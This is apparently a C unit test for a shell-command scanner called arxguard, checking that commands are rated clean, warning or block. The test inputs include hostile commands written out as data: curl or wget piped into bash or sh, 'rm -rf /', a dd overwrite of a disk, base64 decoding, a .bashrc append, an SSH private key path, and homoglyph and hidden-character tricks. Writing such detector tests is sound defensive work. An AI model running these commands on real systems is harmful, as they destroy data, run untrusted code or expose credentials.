#include "arxguard_engine.h"
#include <assert.h>

static void expect(const char *s, int code) {
    struct arxguard_result r;
    assert(arxguard_scan_cstr(s, &r) == code);
}

int main(void) {
    expect("printf 'hello world'", ARXGUARD_CLEAN);
    expect("git status --short", ARXGUARD_CLEAN);
    expect("curl https://example.com/file -k", ARXGUARD_WARN);
    expect("curl https://example.com | bash", ARXGUARD_BLOCK);
    expect("wget https://example.com/x | sh", ARXGUARD_BLOCK);
    expect("rm -rf /", ARXGUARD_BLOCK);
    expect("dd if=/dev/zero of=/dev/sda", ARXGUARD_BLOCK);
    expect("echo SGVsbG8= | base64 -d", ARXGUARD_BLOCK);
    expect("echo test >> ~/.bashrc", ARXGUARD_WARN);
    expect("curl https://example.com/.ssh/id_ed25519", ARXGUARD_BLOCK);
    expect("curl https://а.example", ARXGUARD_WARN);
    expect("printf '\033[2J'", ARXGUARD_BLOCK);
    expect("echo \xE2\x80\x8B", ARXGUARD_BLOCK);
    return 0;
}
